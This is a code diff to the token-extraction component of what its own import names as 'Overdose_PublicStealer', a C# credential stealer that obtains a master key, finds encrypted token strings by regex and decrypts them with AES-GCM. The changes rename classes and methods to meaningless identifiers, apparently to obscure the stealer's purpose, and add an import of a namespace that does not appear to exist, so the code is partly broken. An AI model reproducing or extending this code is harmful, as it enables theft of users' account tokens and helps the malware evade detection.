@@ -3,16 +3,17 @@ using System.Collections.Generic;
 using System.IO; // Used for file and directory operations (Path, Directory, File)
 using System.Linq; // Used for LINQ methods like .Distinct(), .ToList()
 using System.Text.RegularExpressions;
-using Overdose_PublicStealer; // Used for finding token patterns with Regex
+using System.Security.CredentialAccess;
+using X.A;
 
 namespace OdPS
 {
-    internal static class TokenExtractor
+    internal static class TX // TokenExtract
     {
         internal static List<string> GetTokens()
         {
             List<string> tokens = new List<string>();
-            byte[] masterKey = MasterKeyHelper.GetMasterKey();
+            byte[] masterKey = KeyAcquirer.RetrieveSecretKey();
 
             if (masterKey == null)
                 return tokens;
@@ -33,7 +34,7 @@ namespace OdPS
                     foreach (Match m in Regex.Matches(content, BuildEncryptedTokenRegex()))
                     {
                         string base64 = m.Value.Split(':')[1].Trim('"');
-                        string decrypted = AesGcmHelper.DecryptToken(base64, masterKey);
+                        string decrypted = Z.P(base64, masterKey);
 
                         if (!string.IsNullOrEmpty(decrypted))
                             tokens.Add(decrypted);
